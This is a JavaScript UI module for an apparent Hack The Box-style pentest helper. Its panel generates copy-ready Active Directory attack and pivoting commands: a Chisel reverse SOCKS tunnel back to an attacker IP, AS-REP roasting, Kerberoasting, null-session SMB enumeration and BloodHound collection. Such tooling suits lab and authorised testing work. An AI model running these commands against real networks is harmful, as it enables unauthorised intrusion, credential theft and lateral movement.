export const ADPivotPanel = {
  callbacks: {},

  init(callbacks) {
    this.callbacks = callbacks;
  },

  renderSidebar(container) {
    container.innerHTML = `
      <div class="panel-container">
        <div class="panel-group">
          <h3 style="margin: 0 0 5px 0; font-size: 1.1em; color: var(--accent);">AD & Pivoting Maestro</h3>
          <p style="margin: 0; font-size: 0.8em; color: var(--text-status);">Generate tunnels and AD commands.</p>
        </div>

        <!-- IP Configuration -->
        <div style="margin-bottom: 15px; padding: 10px; background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 4px;">
          <div style="margin-bottom: 5px; display: flex; align-items: center; gap: 5px;">
            <label style="font-size: 0.8em; font-weight: bold; width: 80px;">Attacker IP:</label>
            <input type="text" id="ad-attacker-ip" value="10.10.14.X" style="flex: 1; padding: 4px; background: var(--bg-primary); color: var(--text-primary); border: 1px solid var(--border-dark); font-family: monospace;" />
          </div>
          <div style="margin-bottom: 5px; display: flex; align-items: center; gap: 5px;">
            <label style="font-size: 0.8em; font-weight: bold; width: 80px;">Victim IP:</label>
            <input type="text" id="ad-victim-ip" value="10.10.10.X" style="flex: 1; padding: 4px; background: var(--bg-primary); color: var(--text-primary); border: 1px solid var(--border-dark); font-family: monospace;" />
          </div>
          <div style="display: flex; align-items: center; gap: 5px;">
            <label style="font-size: 0.8em; font-weight: bold; width: 80px;">Domain:</label>
            <input type="text" id="ad-domain" value="HTB.LOCAL" style="flex: 1; padding: 4px; background: var(--bg-primary); color: var(--text-primary); border: 1px solid var(--border-dark); font-family: monospace;" />
          </div>
        </div>

        <!-- Pivoting Section -->
        <h4 style="margin: 10px 0 5px 0; color: var(--accent); border-bottom: 1px solid var(--border-color); padding-bottom: 3px;">1. Pivoting (Chisel)</h4>
        <div style="font-size: 0.85em; font-family: monospace; background: var(--bg-secondary); padding: 8px; border: 1px solid var(--border-color); border-radius: 4px; margin-bottom: 15px;">
          <div style="color: var(--text-status); font-weight: bold; margin-bottom: 3px;">Attacker (Kali):</div>
          <div id="ad-chisel-server" style="user-select: all; cursor: pointer; color: #89d185;">chisel server -p 8000 --reverse</div>
          <div style="color: var(--text-status); font-weight: bold; margin-top: 8px; margin-bottom: 3px;">Victim (Target):</div>
          <div id="ad-chisel-client" style="user-select: all; cursor: pointer; color: #89d185;">./chisel client 10.10.14.X:8000 R:socks</div>
          <div style="color: var(--text-status); font-weight: bold; margin-top: 8px; margin-bottom: 3px;">Proxychains (/etc/proxychains4.conf):</div>
          <div style="user-select: all; cursor: pointer; color: #89d185;">socks5 127.0.0.1 1080</div>
        </div>

        <!-- Active Directory Section -->
        <h4 style="margin: 10px 0 5px 0; color: var(--accent); border-bottom: 1px solid var(--border-color); padding-bottom: 3px;">2. Active Directory</h4>
        <div style="font-size: 0.85em; font-family: monospace; background: var(--bg-secondary); padding: 8px; border: 1px solid var(--border-color); border-radius: 4px; margin-bottom: 15px; display: flex; flex-direction: column; gap: 8px;">
          
          <div>
            <div style="color: var(--text-status); font-weight: bold; margin-bottom: 2px;">AS-REP Roasting (Impacket)</div>
            <div id="ad-asrep" style="user-select: all; cursor: pointer; color: #89d185;">impacket-GetNPUsers HTB.LOCAL/ -dc-ip 10.10.10.X -request</div>
          </div>
          
          <div>
            <div style="color: var(--text-status); font-weight: bold; margin-bottom: 2px;">Kerberoasting (Impacket)</div>
            <div id="ad-kerb" style="user-select: all; cursor: pointer; color: #89d185;">impacket-GetUserSPNs -request -dc-ip 10.10.10.X HTB.LOCAL/user:pass</div>
          </div>

          <div>
            <div style="color: var(--text-status); font-weight: bold; margin-bottom: 2px;">NetExec (SMB Enum)</div>
            <div id="ad-nxc" style="user-select: all; cursor: pointer; color: #89d185;">nxc smb 10.10.10.X -u '' -p '' --shares</div>
          </div>

          <div>
            <div style="color: var(--text-status); font-weight: bold; margin-bottom: 2px;">BloodHound (Python)</div>
            <div id="ad-bh" style="user-select: all; cursor: pointer; color: #89d185;">bloodhound-python -u user -p pass -ns 10.10.10.X -d HTB.LOCAL -c all</div>
          </div>
        </div>

      </div>
    `;

    const updateCommands = () => {
      const attacker = document.getElementById('ad-attacker-ip').value || '10.10.14.X';
      const victim = document.getElementById('ad-victim-ip').value || '10.10.10.X';
      const domain = document.getElementById('ad-domain').value || 'HTB.LOCAL';

      document.getElementById('ad-chisel-client').innerText = `./chisel client ${attacker}:8000 R:socks`;
      document.getElementById('ad-asrep').innerText = `impacket-GetNPUsers ${domain}/ -dc-ip ${victim} -request`;
      document.getElementById('ad-kerb').innerText = `impacket-GetUserSPNs -request -dc-ip ${victim} ${domain}/user:pass`;
      document.getElementById('ad-nxc').innerText = `nxc smb ${victim} -u '' -p '' --shares`;
      document.getElementById('ad-bh').innerText = `bloodhound-python -u user -p pass -ns ${victim} -d ${domain} -c all`;
    };

    document.getElementById('ad-attacker-ip').addEventListener('input', updateCommands);
    document.getElementById('ad-victim-ip').addEventListener('input', updateCommands);
    document.getElementById('ad-domain').addEventListener('input', updateCommands);
  }
};
